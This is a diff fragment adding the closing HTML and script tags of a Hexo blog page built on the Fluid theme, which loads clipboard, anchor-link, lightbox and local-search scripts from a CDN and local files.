+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
